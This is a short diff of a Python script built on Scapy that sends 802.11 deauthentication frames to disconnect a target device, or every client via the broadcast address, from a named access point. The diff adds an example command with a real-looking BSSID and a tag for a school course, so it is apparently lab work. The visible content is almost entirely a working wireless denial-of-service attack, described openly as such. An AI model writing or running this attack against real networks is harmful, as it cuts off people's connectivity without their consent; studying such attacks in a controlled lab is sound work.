@@ -18,7 +18,7 @@ def deauth(iface: str, count: int, bssid: str, target_mac: str):
     dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
     frame = RadioTap()/dot11/Dot11Deauth(reason=7)
     sendp(frame, iface=iface, count=count, inter=0.100)
-    
+
 if __name__ == "__main__":
     parser = AP(description="Perform Deauthentication attack against a computer")
     parser.add_argument("-i", "--interface",help="interface to send deauth packets from")
@@ -32,3 +32,4 @@ if __name__ == "__main__":
         exit(1)
     deauth(args.interface, int(args.count), args.bssid, args.target_mac)
     
+    #example usage : sudo python3 deauth.py -i wlan0mon -c 200 -a 7c:95:f3:00:79:d3 -t FF:FF:FF:FF:FF:ff (HEIG-VD)
